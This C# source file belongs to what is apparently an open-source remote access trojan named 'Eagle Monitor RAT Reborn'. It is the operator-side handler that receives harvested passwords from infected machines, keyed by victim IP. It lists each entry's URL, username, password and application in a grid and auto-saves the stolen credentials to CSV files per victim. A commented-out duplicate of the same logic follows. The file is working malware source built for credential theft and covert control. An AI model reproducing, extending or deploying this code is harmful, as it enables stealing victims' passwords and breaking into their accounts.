using Eagle_Monitor_RAT_Reborn.Network;
using PacketLib.Packet;
using System.Windows.Forms;
using Eagle_Monitor_RAT_Reborn.Misc;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Eagle_Monitor_RAT_Reborn.PacketHandler
{
    internal class PasswordsPacketHandler
    {
        public PasswordsPacketHandler(PasswordsPacket passwordsPacket) :base()//, ClientHandler clientHandler)
        {
            if (passwordsPacket.passwordsList != null)
            {
                try
                {
                    if (ClientHandler.ClientHandlersList[passwordsPacket.baseIp].clientForm.passwordsDataGridView != null)
                    {
                        ClientHandler.ClientHandlersList[passwordsPacket.baseIp].clientForm.passwordsDataGridView.BeginInvoke((MethodInvoker)(() =>
                        {
                            ClientHandler.ClientHandlersList[passwordsPacket.baseIp].clientForm.passwordsDataGridView.Rows.Clear();
                            foreach (object[] str in passwordsPacket.passwordsList)
                            {
                                int rowId = ClientHandler.ClientHandlersList[passwordsPacket.baseIp].clientForm.passwordsDataGridView.Rows.Add();
                                DataGridViewRow row = ClientHandler.ClientHandlersList[passwordsPacket.baseIp].clientForm.passwordsDataGridView.Rows[rowId];
                                row.Cells["Column1"].Value = str[0].ToString();
                                row.Cells["Column2"].Value = str[1].ToString();
                                row.Cells["Column3"].Value = str[2].ToString();
                                row.Cells["Column4"].Value = str[3].ToString();
                            }
                            if (Program.settings.autoSaveRecovery)
                                Utils.ToCSV(ClientHandler.ClientHandlersList[passwordsPacket.baseIp].clientForm.passwordsDataGridView, ClientHandler.ClientHandlersList[passwordsPacket.baseIp].clientPath + "\\Passwords\\" + Utils.DateFormater() + ".csv");
                            return;
                        }));
                    }
                    else
                    { Utils.ToCSV(passwordsPacket.passwordsList, ClientHandler.ClientHandlersList[passwordsPacket.baseIp].clientPath + "\\Passwords\\" + Utils.DateFormater() + ".csv", new string[] { "URL", "Username", "Password", "Application" }); }
                }
                catch { Utils.ToCSV(passwordsPacket.passwordsList, ClientHandler.ClientHandlersList[passwordsPacket.baseIp].clientPath + "\\Passwords\\" + Utils.DateFormater() + ".csv", new string[] { "URL", "Username", "Password", "Application" }); }
            }
            else
                return;

            /*new Thread(() =>
            {
                if (passwordsPacket.passwordsList != null)
                {
                    try
                    {
                        if (clientHandler.clientForm.passwordsDataGridView != null)
                        {
                            clientHandler.clientForm.passwordsDataGridView.BeginInvoke((MethodInvoker)(() =>
                            {
                                clientHandler.clientForm.passwordsDataGridView.Rows.Clear();
                                foreach (object[] str in passwordsPacket.passwordsList)
                                {
                                    int rowId = clientHandler.clientForm.passwordsDataGridView.Rows.Add();
                                    DataGridViewRow row = clientHandler.clientForm.passwordsDataGridView.Rows[rowId];
                                    row.Cells["Column1"].Value = str[0].ToString();
                                    row.Cells["Column2"].Value = str[1].ToString();
                                    row.Cells["Column3"].Value = str[2].ToString();
                                    row.Cells["Column4"].Value = str[3].ToString();
                                }
                                if(Program.settings.autoSaveRecovery)
                                    Utils.ToCSV(clientHandler.clientForm.passwordsDataGridView, clientHandler.clientPath + "\\Passwords\\" + Utils.DateFormater() + ".csv");
                                return;
                            }));
                        }
                        else
                        { Utils.ToCSV(passwordsPacket.passwordsList, clientHandler.clientPath + "\\Passwords\\" + Utils.DateFormater() + ".csv", new string[] { "URL", "Username", "Password", "Application" }); }
                    }
                    catch { Utils.ToCSV(passwordsPacket.passwordsList, clientHandler.clientPath + "\\Passwords\\" + Utils.DateFormater() + ".csv", new string[] { "URL", "Username", "Password", "Application" }); }
                }
                else
                    return;
            }).Start();*/
        }
    }
}
